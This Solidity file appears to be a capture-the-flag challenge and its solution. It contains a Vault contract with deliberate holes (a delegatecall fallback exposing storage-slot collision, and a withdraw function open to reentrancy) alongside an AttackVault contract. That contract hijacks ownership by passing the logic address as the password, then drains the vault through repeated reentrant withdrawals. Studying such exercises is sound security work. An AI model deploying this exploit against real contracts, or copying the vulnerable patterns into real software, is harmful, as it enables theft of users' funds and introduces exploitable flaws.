// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultLogic {

  address public owner;
  bytes32 private password;

  constructor(bytes32 _password)  {
    owner = msg.sender;
    password = _password;
  }

  function changeOwner(bytes32 _password, address newOwner) public {
    if (password == _password) {
        owner = newOwner;
    } else {
      revert("password error");
    }
  }
}

contract Vault {

  address public owner;
  VaultLogic logic;
  mapping (address => uint) deposites;
  bool public canWithdraw = false;


  constructor(address _logicAddress)  {
    logic = VaultLogic(_logicAddress);
    owner = msg.sender;
  }


  fallback() external {
    (bool result,) = address(logic).delegatecall(msg.data);
    if (result) {
      this;
    }
  }

  receive() external payable {

  }

  function deposit() public payable { 
    deposites[msg.sender] += msg.value;
  }

  function isSolve() external view returns (bool){
    if (address(this).balance == 0) {
      return true;
    } 
    return false;  // 添加 else 分支的返回值
  }

  function openWithdraw() external {
    if (owner == msg.sender) {
      canWithdraw = true;
    } else {
      revert("not owner");
    }
  }

  function withdraw() public {

    if(canWithdraw && deposites[msg.sender] >= 0) {
      (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
      if(result) {
        deposites[msg.sender] = 0;
      }
    }
  }

}

contract AttackVault {
  
  Vault public vault;   
  VaultLogic public logic;
  constructor(Vault _vaultAddress, VaultLogic _logic)  {
    vault = _vaultAddress;
    logic = _logic;

  }
  function attack() public payable {
    //require(msg.value >= 1 ether, "Need at least 1 ether");
    
    // 尝试直接调用 changeOwner
    bytes memory payload = abi.encodeWithSignature(
        "changeOwner(bytes32,address)",
        bytes32(uint256(uint160(address(logic)))),
        address(this)
    );
    
    // 先存款
    vault.deposit{value: msg.value}();
    
    // 使用低级调用来执行 delegatecall
    (bool success,) = address(vault).call(payload);
    require(success, "Change owner failed");
    
    // 开启提款
    vault.openWithdraw();
    // 提款
    vault.withdraw();
  }
  
  receive() external payable {
    if (address(vault).balance > 0) {
      vault.withdraw();
    }
  }

}